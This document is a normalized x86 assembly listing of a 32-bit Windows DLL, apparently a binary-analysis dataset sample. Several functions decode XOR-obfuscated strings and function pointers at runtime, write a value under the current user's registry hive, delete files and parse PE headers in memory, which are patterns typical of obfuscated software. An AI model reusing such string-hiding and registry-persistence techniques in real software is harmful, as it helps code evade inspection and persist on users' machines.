mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ebx [ ebp - 0x30 ]
push ebx
lea esi [ ebp - 0x2c ]
call sub_10051f70
push eax
lea ecx [ edi + 0x24 ]
mov [ ebp - 0x4 ] 0x6
call sub_100172f0
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
mov eax [ edi + 0x48 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi + 0x40 ] eax
mov [ edi ] 0x1
mov ecx [ ebx + 0x28 ]
add ecx eax
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x24 ]
add [ edi + 0x44 ] edx
mov eax [ ebx + 0x24 ]
mov edx [ ebx + 0x34 ]
push eax
push edx
push ecx
call sub_10078600
mov ecx ebx
add esp 0xc
lea ebx [ edi + 0x50 ]
call sub_10008f20
mov edx [ edi + 0x48 ]
cmp [ edi + 0x44 ] edx
jne r-xdata
mov ecx [ edi + 0x40 ]
call sub_10053f90
mov [ edi + 0x4c ] eax
sub_1000ed60
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ecx
call sub_10048120
mov eax [ ebp - 0x20 ]
mov esi 0x8
cmp [ ebp - 0xc ] esi
jae r-xdata
mov edx [ ebp - 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push edx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea eax [ ebp - 0x20 ]
push ebx
mov ebx [ GetProcessHeap@IAT ]
lea ecx [ edi + 0x1 ]
push ecx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0xc ] esi
jb r-xdata
cmp [ ebp - 0xc ] 0x8
mov eax [ ebp - 0x20 ]
jae r-xdata
cmp [ ebp - 0xc ] 0x8
jb r-xdata
pop edi
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0x10 ]
push 0x0
push 0x0
push edi
push esi
push ecx
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
push esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
pop ebx
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax edi
call sub_1003cdb0
mov ecx [ ebp - 0x28 ]
mov edx [ ecx ]
add esp 0xc
push edx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
inc ecx
push ecx
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp - 0x28 ]
mov [ edx ] eax
test eax eax
jne r-xdata
push eax
call ebx
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0xc ] 0x8
jb r-xdata
mov ecx [ ebp - 0x24 ]
push esi
push ecx
push eax
mov eax edi
call sub_1003cdb0
add esp 0xc
push esi
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
lea ecx [ ebp - 0x20 ]
call sub_10035d10
mov ecx [ ebp - 0x4 ]
pop ebx
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x20 ]
call sub_10035d10
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop ebx
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x20 ]
push edx
call sub_10065045
add esp 0x4
sub_1000ef10
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0xdb0 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0xdb0 ] edi
mov [ esi + 0xdb4 ] edi
mov [ esi + 0xdb8 ] edi
mov eax [ esi + 0xda0 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0xdb4 ]
lea edx [ esi + 0xdbc ]
push edx
push ecx
push eax
call sub_100624a0
mov edx [ esi + 0xdb0 ]
push edx
call sub_10065045
add esp 0x14
mov [ esi + 0xda0 ] edi
mov [ esi + 0xda4 ] edi
mov [ esi + 0xda8 ] edi
pop edi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0xda4 ]
lea edx [ esi + 0xdac ]
push edx
push ecx
push eax
call sub_100624a0
mov edx [ esi + 0xda0 ]
push edx
call sub_10065045
add esp 0x14
sub_1000efa2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10077d10
add esp 0xc
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1002788e
mov eax esi
jmp r-xdata
sub_1000f000
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fb70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x88 ] ecx
cmp eax ebx
jne r-xdata
mov ecx [ ecx ]
push ecx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1005d090
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x1c ]
cmp eax 0xe
jae r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov esi 0x3
cmp eax esi
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov esi eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
push eax
push r--data
push ecx
call sub_10068a30
add esp 0xc
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edi [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp edi 0x10
jb r-xdata
cmp esi 0x3
jb r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10065045
add esp 0x4
xor eax eax
cmp esi 0x3
setne al
cmp eax ebx
je r-xdata
push 0x8
push 0x3
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x84 ] ebx
call sub_1003cd20
push eax
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10025a80
add esp 0xc
mov esi 0x10
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] bl
cmp [ ebp - 0x34 ] esi
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_10065045
add esp 0x4
lea edx [ ebp - 0x84 ]
push edx
push 0x1
push eax
call [ StrToIntExA@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
push 0x3
push 0xb
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1001a9f0
mov ebx eax
push 0x3
lea eax [ ebx + 0x4 ]
push eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1001a9f0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x4
jmp r-xdata
push 0x4
add esi 0x3
push esi
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1001a9f0
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x5
jmp r-xdata
cmp eax esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x6
jmp r-xdata
sub eax esi
mov edi eax
push edi
push esi
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1003cd20
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x80 ]
mov esi 0x10
cmp [ ebp - 0x6c ] esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x7
jmp r-xdata
mov edx edi
call sub_10053f90
cmp eax [ ebp - 0x84 ]
je r-xdata
lea ecx [ ebp - 0x80 ]
cmp ebx 0xb
je r-xdata
lea ecx [ ebp - 0x80 ]
call sub_10021250
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x80 ]
call sub_10021250
lea ecx [ ebp - 0x48 ]
call sub_10021250
lea ecx [ ebp - 0x2c ]
call sub_10021250
xor eax eax
add ebx 0xfffffff5
push ebx
push 0xb
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_1003cd20
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
call sub_100261ca
mov ecx [ ebp - 0x88 ]
mov [ ecx ] eax
add esp 0x4
lea ecx [ ebp - 0x64 ]
call sub_10021250
mov eax [ eax ]
sub_1000f2c4
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1000f2f0
push ebp
mov ebp esp
sub esp 0x31c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0xb8 ] dx
inc eax
cmp eax 0x29
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x318 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0xb8 ]
push edx
push 0x80000001
mov [ ebp - 0x66 ] ax
call esi
test eax eax
je r-xdata
xor eax eax
movzx edx ax
mov eax edx
push edi
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x314 ]
[ edi ]
lea edx [ ebp - 0x3c ]
mov eax 0x66
mov [ ebp - 0x31c ] 0x206
call sub_1001bb80
lea eax [ ebp - 0x31c ]
push eax
mov eax [ ebp - 0x318 ]
lea ecx [ ebp - 0x314 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
mov edi [ RegCloseKey@IAT ]
push ecx
call edi
lea edx [ ebp - 0x10c ]
mov eax 0x27
call sub_1001bb80
lea edx [ ebp - 0x318 ]
push edx
push 0x2
push 0x0
lea eax [ ebp - 0x10c ]
push eax
push 0x80000001
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x101
call sub_1001bb80
mov ecx edx
push ecx
lea edx [ ebp - 0x314 ]
push edx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x145
call sub_1001bb80
lea edx [ ebp - 0xc ]
mov eax 0x16
call sub_1001bb80
mov eax [ ebp - 0x318 ]
push 0x6
mov ecx edx
push ecx
push 0x1
push 0x0
lea edx [ ebp - 0x64 ]
push edx
push eax
call [ RegSetValueExW@IAT ]
test eax eax
je r-xdata
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x318 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x318 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
push ecx
call edi
pop edi
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1000f4d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10082876
mov eax [ fs : 0x0 ]
push eax
sub esp 0x318
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x310 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x328 ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor ebx ebx
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x330 ] ebx
lea eax [ esp + 0x34 ]
mov ecx edi
lea esi [ esp + 0x44 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
call sub_10040a40
mov [ esp + 0x330 ] 0x1
mov esi [ esp + 0x34 ]
cmp esi ebx
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ esp + 0x9c ]
mov eax 0xc4
call sub_1001bb80
cmp [ edi + 0x8 ] ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edx
push esi
call sub_100624a0
push esi
call sub_10065045
add esp 0x14
mov ecx [ esp + 0x328 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x310 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ esp + 0x9c ]
mov eax 0x123
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
cmp [ esp + 0x24 ] ebx
je r-xdata
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x20 ]
lea edi [ esp + 0x28 ]
lea esi [ esp + 0x48 ]
call sub_10032770
cmp eax ebx
je r-xdata
mov eax 0x2
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov eax [ esp + 0x1c ]
cmp eax 0x1e84800
jge r-xdata
lea edx [ esp + 0x18 ]
mov eax 0xae
call sub_1001bb80
mov ecx edx
push ecx
mov ecx [ rw-data ]
push edx
mov eax edx
push eax
push 0x1
push 0x1
push ecx
lea eax [ esp + 0x12c ]
mov [ esp + 0x38 ] 0x1
call sub_10024da0
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
push ebx
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10010790
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push edx
push eax
lea eax [ esp + 0x11c ]
call sub_1000c170
add esp 0x8
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
lea esi [ esp + 0x24 ]
call sub_1002e400
mov eax 0x3
jmp r-xdata
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
cmp esi edi
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ esp + 0x20 ] ebx
je r-xdata
lea esp [ esp ]
lea edx [ esp + 0x9c ]
mov eax 0x3e
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
lea edx [ esp + 0x114 ]
push edx
call sub_10068660
cmp eax ebx
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov ecx [ esi + 0x1c ]
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add esi 0x24
cmp esi edi
jne r-xdata
xor eax eax
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
jmp r-xdata
lea ecx [ esp + 0x114 ]
push ecx
call [ DeleteFileW@IAT ]
lea eax [ esp + 0x114 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x1c
call sub_1001bb80
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] bl
call sub_10054700
mov esi [ esp + 0x24 ]
cmp esi ebx
je r-xdata
mov eax 0x4
jmp r-xdata
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
mov eax 0x5
jmp r-xdata
mov eax esi
call sub_1001b300
push esi
call sub_10065045
add esp 0x4
sub_1000f850
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10011e8f
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000f87a
push 0x8
push r--data
call sub_10078b50
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_10078b95
retn
push 0x6
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000f8c0
call sub_1007d956
inc [ rw-data ]
sub_1000f8d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008192b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi [ rw-data ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x4 ]
lea ebx [ esi + 0x4 ]
sar eax 0x2
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x34 ] edx
cmp eax 0x1e
jb r-xdata
push 0x110
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor edi edi
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
lea ecx [ esi + 0x64 ]
push ecx
lea edx [ esi + 0x48 ]
push edx
lea ecx [ esi + 0x2c ]
push ecx
mov ecx [ esi + 0xbc ]
lea edx [ esi + 0x80 ]
push edx
mov edx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp - 0x34 ]
push edx
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x3c ]
push edx
mov edx [ ebp - 0x38 ]
push edi
mov edi eax
call sub_1002ece0
mov edi eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x18
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
lea edx [ ebp - 0x34 ]
cmp ecx edx
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
cmp ecx eax
jae r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10019240
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x4
mov esi [ esi + 0x8 ]
mov ebx [ ebx ]
mov eax esi
sub eax ebx
push sub_10017220
sar eax 0x2
push eax
push esi
push ebx
call sub_10060520
add esp 0x10
lea edx [ ebp - 0x30 ]
mov eax 0x9
call sub_100328b0
mov eax 0x1
mov [ eax ] edi
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10019240
mov ecx [ ebx ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_1000fa30
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_1000fa70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_10016ae0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + edi ] 0x0
mov esi [ esi ]
sub_1000fab0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000fb00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi ]
mov eax [ esi * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
mov bl 0x38
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
mov ecx [ ebp - 0x4 ]
lea edx [ esi - 0x1 ]
mov [ ebp - 0x4 ] ecx
cmp edx 0x11
ja r-xdata
cmp esi 0x6
je r-xdata
lea eax [ ebp - 0x4 ]
lea ecx [ ebp + 0x8 ]
call sub_100368f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
call [ ebp + 0x8 ]
mov [ edi + 0x4 ] eax
sub_1000fb70
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f8b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] 0x0
call sub_10052185
push r--data
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x24 ] r--data
call sub_1002050e
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_1002d920
mov [ ebp - 0x18 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_10065045
mov ecx [ ebp + 0xc ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_10078600
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_1000fcb6
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_1002050e
int3
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
sub_1000fce5
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_1000fd10
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f828
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
cmp esi edi
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10036a70
mov esi [ esi ]
test esi esi
je r-xdata
lea esp [ esp ]
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov [ edi ] ebx
xor eax eax
mov ecx [ esi ]
push ecx
mov ecx eax
call sub_10032900
jmp r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
cmp [ edi ] 0x0
mov ebx eax
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] eax
